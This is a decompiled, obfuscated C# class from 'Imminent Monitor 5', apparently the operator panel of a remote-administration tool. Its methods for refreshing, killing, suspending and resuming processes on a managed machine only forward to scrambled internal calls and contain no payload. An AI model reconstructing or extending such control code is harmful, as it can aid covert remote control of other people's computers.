// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.ProcessCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System.Collections.Generic;

namespace ImminentMonitor.Cef
{
  public class ProcessCefHandler
  {
    public NewFormSystemManagers SystemManagers;

    public ProcessCefHandler(NewFormSystemManagers systemManagers) => this.SystemManagers = systemManagers;

    public void refresh()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "HiK7mPa.Q$", object_3);
    }

    public void killProcess(Dictionary<string, object> row)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) row
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "i>%N>Pa.Q$", object_3);
    }

    public void suspendProcess(Dictionary<string, object> row)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) row
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "X;d=dPa.Q$", object_3);
    }

    public void resumeProcess(Dictionary<string, object> row)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) row
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "e-V;%Pa.Q$", object_3);
    }
  }
}
